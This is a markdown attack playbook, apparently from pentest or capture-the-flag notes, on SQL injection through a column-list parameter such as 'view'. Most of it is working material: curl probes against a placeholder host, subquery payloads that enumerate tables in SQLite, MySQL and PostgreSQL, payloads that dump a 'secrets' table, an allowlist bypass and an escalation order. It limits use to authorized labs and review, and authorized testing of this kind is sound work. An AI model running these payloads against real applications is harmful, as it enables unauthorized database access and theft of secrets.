# SELECT-List Subquery Exfiltration

## Context

Use this when an application accepts a custom column/view expression that is inserted into the SQL SELECT list, commonly through a parameter such as `view`, `fields`, or `columns`.

## Requirements

- Authorized lab, owned app, in-scope target, or defensive review.
- Do not store live secrets, tokens, cookies, flags, or private URLs in reusable files.

## Baseline

```bash
curl -sS "https://[host]/api/items?view=name,%20price"
```

## Confirm Injection Context

```bash
curl -sS "https://[host]/api/items?view=name'"
```

Look for errors revealing:

```text
SELECT id, ...
FROM items ORDER BY id LIMIT 50
```

## Harmless Subquery Proof

```sql
name, (SELECT 1) as x
```

```bash
curl -sS --get "https://[host]/api/items" --data-urlencode "view=name, (SELECT 1) as x"
```

## SQLite Table Enumeration

```sql
name, (SELECT group_concat(name) FROM sqlite_master WHERE type='table') as t
```

```sql
name, (SELECT sql FROM sqlite_master WHERE name='secrets') as ddl
```

## SQLite Secret Extraction

```sql
name, (SELECT value FROM secrets WHERE label='flag') as flag
```

```sql
name, (SELECT group_concat(label||'='||value, ' | ') FROM secrets) as dump
```

## MySQL Enumeration

```sql
name, (SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()) as t
```

## PostgreSQL Enumeration

```sql
name, (SELECT string_agg(tablename, ',') FROM pg_tables WHERE schemaname='public') as t
```

## Allowlist Bypass Pattern

If direct `FROM hidden_table` is blocked but expressions are allowed, keep a whitelisted column name and append a subquery:

```sql
name, (SELECT value FROM secrets LIMIT 1) as leaked
```

## Why This Works

The server treats the input as part of the SELECT expression list. A scalar subquery executes during row retrieval and its result is returned as an extra JSON/table column.

## Common Mistakes

- Trying UNION before testing expression-context subqueries.
- Attempting `FROM audit...` injection when only SELECT-list expressions are accepted.
- Missing the custom input because preset dropdown options work normally.
- Ignoring DBMS clues in error text such as `sqlite_master` or `unrecognized token`.

## Escalation Order

1. Quote/paren error probing
2. `(SELECT 1) as x`
3. metadata table enumeration
4. target table scalar subquery
5. UNION / stacked queries only if expression injection fails
